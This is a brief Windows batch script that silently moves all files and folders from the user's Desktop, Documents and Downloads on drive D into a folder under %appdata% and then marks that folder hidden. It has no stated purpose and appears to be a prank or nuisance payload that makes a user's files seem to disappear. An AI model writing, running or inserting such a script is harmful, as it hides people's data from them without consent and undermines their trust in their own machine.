@echo off

cd "%appdata%"

IF NOT EXIST world_fluff mkdir world_fluff
cd world_fluff
IF NOT EXIST Desktop mkdir Desktop
IF NOT EXIST Documents mkdir Documents
IF NOT EXIST Downloads mkdir Downloads

cd "D:\%username%\Desktop"
for /D %%G IN (*) DO (
move "%%G" "%appdata%\world_fluff\Desktop\%%G" >nul
)
move * "%appdata%\world_fluff\Desktop" >nul

cd "D:\%username%\Documents"
for /D %%G IN (*) DO (
move "%%G" "%appdata%\world_fluff\Documents\%%G" >nul
)
move * "%appdata%\world_fluff\Documents" >nul

cd "D:\%username%\Downloads"
for /D %%G IN (*) DO (
move "%%G" "%appdata%\world_fluff\Downloads\%%G" >nul
)
move * "%appdata%\world_fluff\Downloads" >nul

cd %appdata%
attrib +h world_fluff /s /d

pause